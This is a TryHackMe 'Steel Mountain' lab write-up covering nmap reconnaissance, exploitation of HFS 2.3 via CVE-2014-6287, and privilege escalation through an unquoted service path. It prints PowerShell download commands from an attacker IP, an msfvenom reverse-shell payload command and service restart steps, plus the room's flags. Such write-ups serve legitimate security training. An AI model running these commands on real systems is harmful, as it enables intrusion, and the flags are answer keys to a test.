# Steel Mountain - TryHackMe - Farouk Abbas

![room_done.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/11.png)

# Intro

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

**Note:** But I won’t rely on Metasploit so i can demonstrate the manual techniques.

# Reconnaissance

## Nmap

```powershell
                                                                                                                                                 
diamond㉿Good-Man ~/Documents/weinnovate/tasks/Network/Win_priv_esc/Steel_Mountain-THM
└─$ nmap -Pn -n -T4 -sV -sC 10.65.156.224 -oN nmap_scan
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-01 23:09 +0200
Nmap scan report for 10.65.156.224
Host is up (0.13s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 8.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2026-01-01T21:10:22+00:00
|_ssl-date: 2026-01-01T21:10:28+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
```

## Port 80 HTTP

**1- Microsoft IIS HTTPD 8.5 - out dated version not secure**

**2- main page**

![port80_1.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/6.png)

First question: Who is the employee of the month?

step 1: i fuzzed on the directories but nothing interested 

step 2: lets download the image and analyze it maybe contains anything reveals the name 

before i analyze anything i noticed the name of the image and it reveals the answer.

![port80_2.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/7.png)

## PORT 445 SMB

SMB seems to be secure but the only thing can be documented that there is no rate limiting so anyone can brute force the username and password

![port445_1.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/8.png)

## PORT 3389 RDP

Again nothing interesting but only some info about the domain name and the host name and the version of the rdp

```powershell
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
```

and there is no rate limiting + connecting to the target via rdp reveals the version of the OS 

**Windows 8.1 or Windows Server 2012 R2 Build 9600**

![port3389_1.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/9.png)

## Port 5985 **WinRM HTTP**

It seems to be secure 

## Port 8080 HttpFileServer - Vulnerable

HttpFileServer httpd 2.3 / HFS 2.3

Rejetto HTTP File Server

This is totally vulnerable to **CVE-2014-6287 has a critical RCE** 

[https://www.exploit-db.com/exploits/49584](https://www.exploit-db.com/exploits/49584)

# Exploitation

**1- copy the payload** 

![Payload_cop.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/Payload_cop.png)

**2- To exploit you need to start a listener and HTTP server that hosts a `nc.exe` also you will edit the payload to change the LHOST AND LPORT of NETCAT The run the payload 2 times and your shell will be spawned.**

![port8080_1_exploit.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/port8080_1_exploit.png)

**FLAG1: b04763b6fcf51fcd7c13abc7db4fd365**

![flag1.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/flag1.png)

# Post-Exploitation

### Local Enumeration

**Step1: We need to transfer the WinPeas tool so we can enumerate the machine** 

command used: 

```powershell
powershell -c "Invoke-WebRequest -Uri http://192.168.160.149:80/winPEASx64.exe -OutFile winpeas.exe"
```

![winpeas.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/winpeas.png)

**WinPeas located a potential Priv esc vector**

- **Binary Path**: `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- **Startup Type**: Auto (runs at boot).
- **Status**: Running.
- **Path Issue**: *Unquoted path with spaces* → `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- **Permissions**: User `bill` has **WriteData/CreateFiles** permissions in the folder.
- **Possible Attack**: DLL hijacking in the binary folder.

![winpeas_2.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/winpeas_2.png)

## Privilege Escalation

**To exploit now we can create a malicious executable named `Advanced.exe` and place it in `C:\Program Files (x86)\IObit\`**

**Step1: Create the payload with msfvenom reverse shell** 

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.160.149 LPORT=1234 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

**Step2: Transfer it to the windows** 

```powershell
powershell -c "Invoke-WebRequest -Uri http://192.168.160.149:80/Advanced.exe -OutFile Advanced.exe"
```

**Step3: copy the payload to the vulnerable path**

```powershell
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced.exe"
```

**Step4: Stop and Rerun the service** 

```powershell
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

![exploit_3.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/exploit_3.png)

**Step5: Check the other tab that has the listener** 

![exploit_4.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/exploit_4.png)

**Done!! i have gained the highest privilege in the system** 

**Now i will grab the root flag**

![flag2.png](Steel%20Mountain%20-%20TryHackMe%20-%20Farouk%20Abbas/flag2.png)

FLAG2: 9af5f314f57607c00fd09803a587db80
